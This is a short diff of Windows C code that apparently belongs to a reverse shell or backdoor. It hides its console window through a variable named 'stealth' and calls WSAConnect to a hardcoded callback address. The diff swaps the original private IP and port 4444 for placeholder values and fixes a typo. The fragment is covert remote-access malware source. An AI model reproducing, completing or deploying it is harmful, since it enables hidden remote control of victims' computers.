@@ -19,8 +19,8 @@ int main()
 	struct sockaddr_in sock_addr;
     char recvserver[8000];
 	WSADATA wsa;
-	char ip_addr[] = "192.168.1.42";
-	int port = 4444;
+	char ip_addr[] = "0.0.0.0";
+	int port = 0000;
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
@@ -35,7 +35,7 @@ int main()
 
 	sock_addr.sin_port = htons(port);
 	sock_addr.sin_family = AF_INET;
-	socka_addr.sin_addr.s_addr = inet_addr(ip_addr);
+	sock_addr.sin_addr.s_addr = inet_addr(ip_addr);
     
     int connection = WSAConnect(sock, (SOCKADDR*)&sock_addr,sizeof(sock_addr),NULL,NULL,NULL,NULL);
     
